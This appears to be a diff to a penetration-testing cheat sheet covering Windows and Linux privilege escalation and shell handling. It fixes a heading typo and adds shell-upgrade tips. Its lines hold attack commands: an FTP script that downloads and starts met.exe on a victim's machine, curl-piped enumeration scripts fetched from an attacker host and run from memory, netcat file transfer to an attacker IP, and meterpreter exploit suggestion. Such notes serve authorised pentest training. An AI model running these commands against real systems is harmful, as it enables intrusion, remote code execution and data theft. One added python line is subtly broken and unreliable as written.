@@ -21,7 +21,7 @@
 * `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_
 * `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
 
-## Pric Esc Linux
+## Priv Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
 * `curl {kali_ip}:{port}/linuxprivchecker.py | python` _Run linux priv checker without dropping it on disk_
 * `/sbin/getcap -r / 2>/dev/null` _Search filesytem for files with special capabilities.  Similar to suid_
@@ -30,6 +30,8 @@
 * `nc -w 3 {attacker ip} {port} < {filename}` _Send file with netcat_
 * `nc -l -p {listen port} > {filename}` _Receive file with netcat_
 * `sudo -l` _Show commands that can be run as sudo_
+* `python -c 'import pty:pty.spawn("/bin/bash")'` _Get a better shell in netcat_
+* `CTRZ + z -- stty raw -echo  -- fg` _Make netcat python shell interactive.  You won't see fg when it's typed.  Just hit enter._
 
 ## Pric Esc Generic
 * `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_
